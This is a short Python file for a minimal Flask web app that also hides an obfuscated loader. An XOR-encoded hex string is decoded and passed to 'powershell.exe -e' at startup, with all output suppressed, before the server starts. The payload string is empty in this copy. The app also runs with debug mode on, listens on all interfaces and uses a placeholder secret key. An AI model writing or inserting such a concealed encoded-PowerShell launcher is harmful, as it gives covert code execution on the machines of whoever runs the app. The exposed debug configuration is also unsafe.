import subprocess
from flask import Flask

app = Flask(__name__)
app.secret_key = "your_secret_key_here"

@app.route('/')
def index():
    return "Welcome"

# def beta(data):
#     encoded = bytes([b ^ 0x20 for b in data.encode('utf-8')])
#     return encoded.hex().upper()

def sigma(prayers):
    decoded = bytes([b ^ 0x20 for b in bytes.fromhex(prayers)])
    return decoded.decode('utf-8')

if __name__ == '__main__':
    xyz = ""
    subprocess.Popen(["powershell.exe", "-e", sigma(xyz)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    app.run(host='0.0.0.0', port=5000, debug=True)
